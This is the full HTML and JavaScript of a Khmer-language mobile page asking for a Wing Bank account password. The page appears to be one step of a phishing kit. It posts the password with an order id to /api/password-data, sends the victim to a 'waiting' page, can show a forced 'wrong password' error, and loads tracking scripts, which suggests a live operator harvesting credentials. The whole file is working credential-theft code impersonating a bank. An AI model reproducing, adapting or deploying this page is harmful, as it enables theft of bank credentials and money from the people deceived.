<!DOCTYPE html>
<html lang="km" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ពាក្យសម្ងាត់</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;
  max-width:520px;margin:0 auto;min-height:100vh;min-height:100dvh;background:#fff;display:flex;flex-direction:column}

.back-btn{
  display:flex;align-items:center;justify-content:center;
  width:44px;height:44px;background:none;border:none;cursor:pointer;
  margin:10px 6px 0;
}
.back-btn svg{width:24px;height:24px;stroke:#1a1a1a;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.content{flex:1;padding:16px 24px 0;display:flex;flex-direction:column}

.heading{font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:12px}
.subtitle{font-size:15px;color:#6b7280;line-height:1.5;margin-bottom:36px}

.pass-box{
  display:flex;align-items:center;
  background:#f2f3f5;border-radius:14px;
  height:56px;overflow:hidden;
  position:relative;
}
.pass-icon{
  display:flex;align-items:center;justify-content:center;
  width:52px;height:100%;flex-shrink:0;
  border-right:1px solid #dfe1e5;
}
.pass-icon svg{width:22px;height:22px;stroke:#9ca3af;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.pass-input{
  flex:1;border:none;outline:none;background:transparent;
  padding:0 16px;font-size:16px;color:#1a1a1a;
  font-family:inherit;height:100%;
}
.pass-input::placeholder{color:#9ca3af;font-weight:400}

.toggle-pass{
  position:absolute;right:14px;top:50%;transform:translateY(-50%);
  background:none;border:none;cursor:pointer;padding:4px;
}
.toggle-pass svg{width:22px;height:22px;stroke:#9ca3af;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:12px;padding:12px 14px;margin:16px 0 0;color:#dc2626;font-size:14px;text-align:center;font-weight:600}

.bottom-bar{padding:16px 24px 32px;transition:padding-bottom .15s}
.start-btn{
  width:100%;height:54px;border:none;border-radius:50px;
  font-size:17px;font-weight:600;color:#fff;
  background:#A9CF38;cursor:pointer;
  font-family:inherit;transition:.2s;
  box-shadow:0 4px 12px rgba(169,207,56,.25);
}
.start-btn:hover{background:#8BB52E}
.start-btn:disabled{opacity:.45;cursor:default;box-shadow:none}
</style>
</head>
<body>

<button class="back-btn" onclick="history.back()" aria-label="Back">
  <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
</button>

<div class="content">
  <h1 class="heading">ពាក្យសម្ងាត់</h1>
  <p class="subtitle">បញ្ចូលពាក្យសម្ងាត់គណនី Wing Bank របស់អ្នក.</p>

  <div class="pass-box">
    <div class="pass-icon">
      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    </div>
    <input class="pass-input" id="password" type="password" placeholder="ពាក្យសម្ងាត់" oninput="ck()">
    <button class="toggle-pass" onclick="togglePass()" aria-label="Toggle password">
      <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
    </button>
  </div>

  <div class="err" id="err"></div>
</div>

<div class="bottom-bar">
  <button class="start-btn" id="go" onclick="sub()" disabled>បន្ត</button>
</div>

<script>
var ps = new URLSearchParams(location.search);
var oid = ps.get("order");
var phone = ps.get("phone");
if(!oid) location.href = "index.html";

function phoneQS(){ return phone ? "&phone=" + encodeURIComponent(phone) : ""; }

if(ps.get("error") === "1"){
  var ee = document.getElementById("err");
  ee.textContent = "ពាក្យសម្ងាត់មិនត្រឹមត្រូវ";
  ee.style.display = "block";
  history.replaceState(null, "", "password.html?order=" + oid + phoneQS());
}

function ck(){
  var p = document.getElementById("password").value;
  document.getElementById("go").disabled = p.length < 4;
}

function togglePass(){
  var inp = document.getElementById("password");
  inp.type = inp.type === "password" ? "text" : "password";
}

async function sub(){
  var p = document.getElementById("password").value;
  if(p.length < 4) return;
  var btn = document.getElementById("go");
  btn.disabled = true;
  btn.textContent = "សូមរង់ចាំ...";
  try {
    var r = await fetch("/api/password-data", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ order_id: oid, password: p })
    });
    var d = await r.json();
    if(!d.success){ se(d.message || "កំហុស"); btn.disabled = false; btn.textContent = "បន្ត"; return; }
    location.href = "password-waiting.html?order=" + oid + phoneQS();
  } catch(e){
    se("កំហុសក្នុងការភ្ជាប់");
    btn.disabled = false;
    btn.textContent = "បន្ត";
  }
}

function se(m){
  var e = document.getElementById("err");
  e.textContent = m;
  e.style.display = "block";
  setTimeout(function(){ e.style.display = "none"; }, 3000);
}

document.getElementById("password").addEventListener("keydown", function(e){
  if(e.key === "Enter") sub();
});

if(window.visualViewport){
  var bar = document.querySelector(".bottom-bar");
  var passBox = document.querySelector(".pass-box");
  window.visualViewport.addEventListener("resize", function(){
    var diff = window.innerHeight - window.visualViewport.height;
    if(diff > 100){
      bar.style.paddingBottom = (diff + 12) + "px";
      passBox.scrollIntoView({behavior:"smooth", block:"center"});
    } else {
      bar.style.paddingBottom = "";
    }
  });
}
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
